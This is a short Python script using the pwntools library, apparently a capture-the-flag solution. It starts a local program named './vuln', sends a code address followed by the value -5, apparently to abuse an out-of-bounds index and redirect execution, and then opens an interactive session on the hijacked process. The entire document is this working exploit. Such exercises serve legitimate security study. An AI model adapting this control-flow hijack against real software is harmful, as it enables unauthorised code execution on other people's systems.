from pwn import *
print(0x80485c6)

sock = process("./vuln")
sock.recvline()
sock.recvline()
sock.sendline(str(0x80485c6))
sock.recvline()
sock.recvline()
sock.sendline(str(-5))
sock.interactive()
